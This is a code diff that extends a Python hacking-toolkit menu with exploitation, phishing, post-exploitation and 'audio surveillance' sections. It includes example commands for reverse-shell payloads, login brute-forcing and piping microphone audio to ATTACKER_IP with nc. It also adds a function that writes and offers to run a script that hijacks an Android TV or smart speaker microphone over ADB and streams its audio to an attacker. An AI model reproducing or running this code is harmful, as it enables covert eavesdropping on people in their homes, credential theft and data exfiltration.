@@ -41,6 +41,27 @@ TOOL_MAP = {
     "wpscan": ("wpscan", "wpscan"),
     "aircrack-ng": ("aircrack-ng", "aircrack-ng"),
     "wifite": ("wifite", "wifite"),
+    # --- NEW: Exploitation ---
+    "metasploit": ("msfconsole", "metasploit-framework"),
+    "sqlmap": ("sqlmap", "sqlmap"),
+    "hydra": ("hydra", "hydra"),
+    "john": ("john", "john"),
+    "hashcat": ("hashcat", "hashcat"),
+    "searchsploit": ("searchsploit", "exploitdb"),
+    # --- NEW: Post-Exploitation ---
+    "crackmapexec": ("crackmapexec", "crackmapexec"),
+    "chisel": ("chisel", "chisel"),
+    # --- NEW: Phishing ---
+    "setoolkit": ("setoolkit", "set"),
+    "gophish": ("gophish", "gophish"),
+    # --- NEW: IoT / Hardware ---
+    "bettercap": ("bettercap", "bettercap"),
+    "binwalk": ("binwalk", "binwalk"),
+    # --- NEW: Audio / Covert ---
+    "ffmpeg": ("ffmpeg", "ffmpeg"),
+    "sox": ("sox", "sox"),
+    "dnscat2": ("dnscat2", "dnscat2"),
+    "steghide": ("steghide", "steghide"),
 }
 
 # Plain-English descriptions, example usage, and the exact help flag per tool
@@ -200,6 +221,218 @@ TOOL_INFO = {
             "sudo wifite --kill --wps",
         ],
         "help_cmd": "wifite --help",
+    },
+    # --- NEW: Exploitation tool descriptions ---
+    "metasploit": {
+        "what": [
+            "Metasploit is the most widely used exploitation framework.",
+            "It contains thousands of exploits, payloads, and auxiliary modules",
+            "for penetration testing across all platforms.",
+        ],
+        "example": [
+            "msfconsole",
+            "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.10; run'",
+            "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf > payload.elf",
+        ],
+        "help_cmd": "msfconsole -h",
+    },
+    "sqlmap": {
+        "what": [
+            "sqlmap automates detection and exploitation of SQL injection flaws.",
+            "It can fingerprint databases, extract data, and even gain shell access",
+            "through out-of-band channels when DB permissions allow.",
+        ],
+        "example": [
+            "sqlmap -u 'https://example.com/page?id=1'",
+            "sqlmap -u 'https://example.com/page?id=1' --dbs",
+            "sqlmap -u 'https://example.com/page?id=1' -D database_name --tables",
+        ],
+        "help_cmd": "sqlmap --help",
+    },
+    "hydra": {
+        "what": [
+            "Hydra is a network login cracker supporting many protocols.",
+            "It brute-forces authentication for SSH, FTP, HTTP, SMB, RDP, and more.",
+            "Extremely fast — uses parallel connections per target.",
+        ],
+        "example": [
+            "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1",
+            "hydra -L users.txt -P pass.txt ftp://192.168.1.1",
+            "hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'",
+        ],
+        "help_cmd": "hydra -h",
+    },
+    "john": {
+        "what": [
+            "John the Ripper is a fast offline password cracker.",
+            "It supports many hash formats (MD5, SHA, NTLM, bcrypt, etc.)",
+            "and auto-detects hash type from the input file.",
+        ],
+        "example": [
+            "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
+            "john --show hashes.txt",
+            "john --incremental hashes.txt",
+        ],
+        "help_cmd": "john -h",
+    },
+    "hashcat": {
+        "what": [
+            "Hashcat is the world's fastest password recovery utility.",
+            "It leverages GPU acceleration to crack hashes at billions of attempts per second.",
+            "Supports all major hash modes (MD5, SHA1, SHA256, NTLM, Kerberos, etc.).",
+        ],
+        "example": [
+            "hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt",
+            "hashcat -m 1000 -a 3 hashes.txt ?l?l?l?l?l?l?l?l",
+            "hashcat -m 13100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --show",
+        ],
+        "help_cmd": "hashcat --help",
+    },
+    "searchsploit": {
+        "what": [
+            "Searchsploit lets you search the Exploit-DB archive from your terminal.",
+            "Find exact exploits, shellcodes, and papers for a given software/version.",
+            "Results include local paths to the exploit source files.",
+        ],
+        "example": [
+            "searchsploit apache 2.4",
+            "searchsploit -t linux kernel",
+            "searchsploit -p 12345.py",
+        ],
+        "help_cmd": "searchsploit -h",
+    },
+    # --- NEW: Post-Exploitation descriptions ---
+    "crackmapexec": {
+        "what": [
+            "CrackMapExec (CME) is a post-exploitation toolkit for Windows/AD environments.",
+            "It automates credential spraying, SMB enumeration, PSExec, secrets dumping,",
+            "and pivoting across compromised hosts in a domain.",
+        ],
+        "example": [
+            "crackmapexec smb 192.168.1.0/24 -u administrator -H LM:NT hashes.txt",
+            "crackmapexec smb 192.168.1.100 -u user -p pass --shares",
+            "crackmapexec smb 192.168.1.100 -u user -p pass -x whoami",
+        ],
+        "help_cmd": "crackmapexec --help",
+    },
+    "chisel": {
+        "what": [
+            "Chisel creates fast TCP/UDP tunnels over HTTP.",
+            "It's a single binary that works as both client and server,",
+            "perfect for pivoting through firewalls in restricted egress environments.",
+        ],
+        "example": [
+            "# On attacker:  chisel server --reverse --port 8000",
+            "# On target:    chisel client ATTACKER_IP:8000 R:8080:127.0.0.1:80",
+            "chisel server --reverse --port 8000",
+        ],
+        "help_cmd": "chisel --help",
+    },
+    # --- NEW: Phishing descriptions ---
+    "setoolkit": {
+        "what": [
+            "The Social-Engineer Toolkit (SET) automates phishing attacks.",
+            "It includes website cloning, credential harvesting, email phishing,",
+            "and malicious payload generation for social engineering campaigns.",
+        ],
+        "example": [
+            "sudo setoolkit",
+            "# Then: 1) Social-Engineering Attacks > 2) Website Attack Vectors > 3) Credential Harvester",
+        ],
+        "help_cmd": "setoolkit --help",
+    },
+    "gophish": {
+        "what": [
+            "GoPhish is an open-source phishing campaign framework.",
+            "It provides a web UI to design, launch, and track phishing campaigns",
+            "with real-time click/open/credential-submission statistics.",
+        ],
+        "example": [
+            "# Run server: gophish",
+            "# Access admin UI at https://127.0.0.1:3333",
+            "# Default creds: admin / gophish (change on first login)",
+        ],
+        "help_cmd": "gophish --help",
+    },
+    # --- NEW: IoT descriptions ---
+    "bettercap": {
+        "what": [
+            "BetterCap is a powerful MITM framework for network attacks.",
+            "It can intercept HTTP/HTTPS, inject JavaScript, sniff credentials,",
+            "and perform BLE, Wi-Fi, and Ethernet-level attacks from one interface.",
+        ],
+        "example": [
+            "sudo bettercap -iface wlan0",
+            "net.sniff on",
+            "https.proxy on",
+        ],
+        "help_cmd": "bettercap --help",
+    },
+    "binwalk": {
+        "what": [
+            "Binwalk analyses and extracts firmware images.",
+            "It detects file signatures, filesystems (SquashFS, JFFS2, etc.),",
+            "and embedded binaries inside IoT device firmware dumps.",
+        ],
+        "example": [
+            "binwalk firmware.bin",
+            "binwalk -Me firmware.bin",
+            "binwalk --signature firmware.bin",
+        ],
+        "help_cmd": "binwalk --help",
+    },
+    # --- NEW: Audio / Covert descriptions ---
+    "ffmpeg": {
+        "what": [
+            "FFmpeg captures, converts, and streams audio/video from any source.",
+            "For audio surveillance: capture microphone input, encode, and stream",
+            "to a remote listener over TCP, UDP, or RTSP.",
+        ],
+        "example": [
+            "ffmpeg -f alsa -i default -f wav - | nc ATTACKER_IP 4444",
+            "ffmpeg -f pulse -i default -acodec mp3 output.mp3",
+            "ffmpeg -f alsa -i hw:0,0 -f rtp rtp://ATTACKER_IP:5555",
+        ],
+        "help_cmd": "ffmpeg -h",
+    },
+    "sox": {
+        "what": [
+            "SoX (Sound eXchange) processes and records audio from the command line.",
+            "Lightweight alternative to FFmpeg for basic mic capture and format conversion.",
+            "Great for minimal-resource IoT targets.",
+        ],
+        "example": [
+            "rec -t wav - | nc ATTACKER_IP 4444",
+            "rec output.wav trim 0 10",
+            "sox output.wav -n spectrogram",
+        ],
+        "help_cmd": "sox --help",
+    },
+    "dnscat2": {
+        "what": [
+            "DNSCat2 tunnels data over DNS queries and responses.",
+            "It bypasses firewalls that block traditional C2 channels",
+            "by encoding data inside DNS requests to a controlled domain.",
+        ],
+        "example": [
+            "# Server:  dnscat2-server your-domain.com",
+            "# Client:  dnscat2 --dns server=your-domain.com",
+            "dnscat2-server your-domain.com",
+        ],
+        "help_cmd": "dnscat2 --help",
+    },
+    "steghide": {
+        "what": [
+            "Steghide embeds secret data inside image/audio files.",
+            "You can hide captured audio payloads inside JPEG, BMP, WAV, or AU files",
+            "for covert exfiltration past content inspection filters.",
+        ],
+        "example": [
+            "steghide embed -cf cover.jpg -ef secret.wav -p passphrase",
+            "steghide extract -sf stego.jpg -p passphrase",
+            "steghide info stego.jpg",
+        ],
+        "help_cmd": "steghide --help",
     },
 }
 
@@ -666,6 +899,181 @@ def wireless_menu():
 
 
 # ─────────────────────────────────────────────────────────
+# NEW: Exploitation menu
+# ─────────────────────────────────────────────────────────
+
+def exploitation_menu():
+    options = {
+        "1": ("metasploit", "Full exploitation framework"),
+        "2": ("sqlmap", "SQL injection automation"),
+        "3": ("hydra", "Network login brute-forcer"),
+        "4": ("john", "Offline password cracker"),
+        "5": ("hashcat", "GPU-accelerated hash cracking"),
+        "6": ("searchsploit", "Exploit-DB search"),
+    }
+    while True:
+        clear_screen()
+        header()
+        print(f"  {YELLOW}[ Exploitation ]{RESET}\n")
+        for k, (name, desc) in options.items():
+            print(f"  {GREEN}[{k}]{RESET} {name:<16} {CYAN}->{RESET} {desc}")
+        print(f"\n  {RED}[0]{RESET} Back\n")
+        c = input(f"  {BOLD}Vector: {RESET}").strip()
+        if c in options:
+            launch_tool(options[c][0])
+        elif c == "0":
+            break
+
+
+# ─────────────────────────────────────────────────────────
+# NEW: Post-Exploitation menu
+# ─────────────────────────────────────────────────────────
+
+def post_exploit_menu():
+    options = {
+        "1": ("crackmapexec", "Active Directory post-exploitation"),
+        "2": ("chisel", "Tunnelling / pivoting"),
+    }
+    while True:
+        clear_screen()
+        header()
+        print(f"  {YELLOW}[ Post-Exploitation & Lateral Movement ]{RESET}\n")
+        for k, (name, desc) in options.items():
+            print(f"  {GREEN}[{k}]{RESET} {name:<16} {CYAN}->{RESET} {desc}")
+        print(f"\n  {RED}[0]{RESET} Back\n")
+        c = input(f"  {BOLD}Vector: {RESET}").strip()
+        if c in options:
+            launch_tool(options[c][0])
+        elif c == "0":
+            break
+
+
+# ─────────────────────────────────────────────────────────
+# NEW: Phishing menu
+# ─────────────────────────────────────────────────────────
+
+def phishing_menu():
+    options = {
+        "1": ("setoolkit", "Social-Engineer Toolkit"),
+        "2": ("gophish", "Phishing campaign framework"),
+    }
+    while True:
+        clear_screen()
+        header()
+        print(f"  {YELLOW}[ Phishing & Social Engineering ]{RESET}\n")
+        for k, (name, desc) in options.items():
+            print(f"  {GREEN}[{k}]{RESET} {name:<16} {CYAN}->{RESET} {desc}")
+        print(f"\n  {RED}[0]{RESET} Back\n")
+        c = input(f"  {BOLD}Vector: {RESET}").strip()
+        if c in options:
+            launch_tool(options[c][0])
+        elif c == "0":
+            break
+
+
+# ─────────────────────────────────────────────────────────
+# NEW: IoT / Hardware menu
+# ─────────────────────────────────────────────────────────
+
+def iot_menu():
+    options = {
+        "1": ("bettercap", "MITM framework (Wi-Fi / BLE / Ethernet)"),
+        "2": ("binwalk", "Firmware extraction & analysis"),
+    }
+    while True:
+        clear_screen()
+        header()
+        print(f"  {YELLOW}[ IoT / Hardware Hacking ]{RESET}\n")
+        for k, (name, desc) in options.items():
+            print(f"  {GREEN}[{k}]{RESET} {name:<16} {CYAN}->{RESET} {desc}")
+        print(f"\n  {RED}[0]{RESET} Back\n")
+        c = input(f"  {BOLD}Vector: {RESET}").strip()
+        if c in options:
+            launch_tool(options[c][0])
+        elif c == "0":
+            break
+
+
+# ─────────────────────────────────────────────────────────
+# NEW: Audio Surveillance menu (for your IoT listening project)
+# ─────────────────────────────────────────────────────────
+
+def run_iot_audio_payload():
+    """PoC payload: hijack an Android TV / IoT device mic via ADB."""
+    clear_screen()
+    header()
+    print(f"  {YELLOW}[ IoT Audio Hijack — PoC ]{RESET}\n")
+
+    target_ip = input(f"  {BOLD}Target IP (Android TV / smart speaker): {RESET}").strip()
+    attacker_ip = input(f"  {BOLD}Your IP (receiving end): {RESET}").strip()
+    port = input(f"  {BOLD}Port [4444]: {RESET}").strip() or "4444"
+
+    script = f"""#!/bin/bash
+echo "[*] Attempting ADB connect to {target_ip}..."
+adb connect {target_ip}:5555 2>/dev/null
+
+echo "[*] Checking device..."
+DEVICE=$(adb devices | awk 'NR==2{{print $1}}')
+if [ -z "$DEVICE" ]; then
+    echo "[!] No device connected. Make sure ADB debugging is enabled."
+    exit 1
+fi
+
+echo "[+] Connected to $DEVICE"
+
+echo "[*] Attempting mic activation..."
+adb shell am start -a android.intent.action.VOICE_COMMAND 2>/dev/null
+adb shell am broadcast -a com.google.android.googlequicksearchbox.VOICE_ASSISTANT 2>/dev/null
+
+echo "[*] Checking audio devices..."
+adb shell dumpsys media_audio_flinger | grep -i mic -A 5
+
+echo "[*] Attempting audio stream capture..."
+adb shell "cat /dev/snd/pcmC0D0c 2>/dev/null" | nc {attacker_ip} {port}
+
+echo "[+] Stream ended."
+"""
+
+    script_path = "/tmp/godseye_iot_hijack.sh"
+    with open(script_path, "w") as f:
+        f.write(script)
+    os.chmod(script_path, 0o755)
+
+    print(f"  {CYAN}[*] Payload ready: {script_path}{RESET}")
+    print(f"  {CYAN}[*] On your listener, run: nc -lvnp {port} > captured_audio.raw{RESET}\n")
+
+    ans = input(f"  {BOLD}Run payload now? [y/N]: {RESET}").strip().lower()
+    if ans == "y":
+        open_in_terminal("IoT Audio Hijack", script_path, wait=False)
+
+    pause()
+
+
+def audio_surveillance_menu():
+    options = {
+        "1": ("ffmpeg", "Capture / stream audio"),
+        "2": ("sox", "Lightweight audio capture"),
+        "3": ("dnscat2", "DNS-tunneled data exfiltration"),
+        "4": ("steghide", "Hide audio inside images / audio files"),
+    }
+    while True:
+        clear_screen()
+        header()
+        print(f"  {YELLOW}[ Audio Surveillance — IoT Listening Post ]{RESET}\n")
+        for k, (name, desc) in options.items():
+            print(f"  {GREEN}[{k}]{RESET} {name:<16} {CYAN}->{RESET} {desc}")
+        print(f"\n  {GREEN}[P]{RESET} Run IoT Audio Hijack PoC (ADB mic capture)")
+        print(f"\n  {RED}[0]{RESET} Back\n")
+        c = input(f"  {BOLD}Vector: {RESET}").strip()
+        if c in options:
+            launch_tool(options[c][0])
+        elif c.lower() == "p":
+            run_iot_audio_payload()
+        elif c == "0":
+            break
+
+
+# ─────────────────────────────────────────────────────────
 # Integrations  — UNCHANGED
 # ─────────────────────────────────────────────────────────
 
@@ -732,7 +1140,7 @@ def about():
 
 
 # ─────────────────────────────────────────────────────────
-# Main menu  — UNCHANGED
+# Main menu  — UPDATED with new categories
 # ─────────────────────────────────────────────────────────
 
 def main_menu():
@@ -748,15 +1156,22 @@ def main_menu():
         print(f"  {GREEN}[3]{RESET} Web Scan          {GREEN}[4]{RESET} Web Vuln")
         print(f"  {GREEN}[5]{RESET} Wireless Audit")
 
+        print(f"\n  {YELLOW}[ Exploitation / Post-Exploit ]{RESET}")
+        print(f"  {GREEN}[6]{RESET} Exploitation      {GREEN}[7]{RESET} Post-Exploit & Pivot")
+        print(f"  {GREEN}[8]{RESET} Phishing / Social Eng")
+
+        print(f"\n  {YELLOW}[ IoT / Audio ]{RESET}")
+        print(f"  {GREEN}[9]{RESET} IoT & Hardware     {GREEN}[10]{RESET} Audio Surveillance")
+
         print(f"\n  {YELLOW}[ Anonymity ]{RESET}")
-        print(f"  {GREEN}[6]{RESET} MAC Changer       {GREEN}[7]{RESET} IP Changer")
-        print(f"  {GREEN}[8]{RESET} GOD'S FIX")
+        print(f"  {GREEN}[11]{RESET} MAC Changer       {GREEN}[12]{RESET} IP Changer")
+        print(f"  {GREEN}[13]{RESET} GOD'S FIX")
 
         print(f"\n  {YELLOW}[ Integrations ]{RESET}")
-        print(f"  {GREEN}[9]{RESET} External Tools & Integrations")
+        print(f"  {GREEN}[14]{RESET} External Tools & Integrations")
 
         print(f"\n  {YELLOW}[ Info ]{RESET}")
-        print(f"  {GREEN}[10]{RESET} About / Authors")
+        print(f"  {GREEN}[15]{RESET} About / Authors")
         print(f"\n  {RED}[0]{RESET} Exit\n")
 
         c = input(f"  {BOLD}Vector: {RESET}").strip()
@@ -767,11 +1182,16 @@ def main_menu():
             "3": web_scan_menu,
             "4": web_vuln_menu,
             "5": wireless_menu,
-            "6": mac_changer,
-            "7": ip_changer,
-            "8": gods_fix,
-            "9": integrations_menu,
-            "10": about,
+            "6": exploitation_menu,
+            "7": post_exploit_menu,
+            "8": phishing_menu,
+            "9": iot_menu,
+            "10": audio_surveillance_menu,
+            "11": mac_changer,
+            "12": ip_changer,
+            "13": gods_fix,
+            "14": integrations_menu,
+            "15": about,
         }
 
         if c in routes:
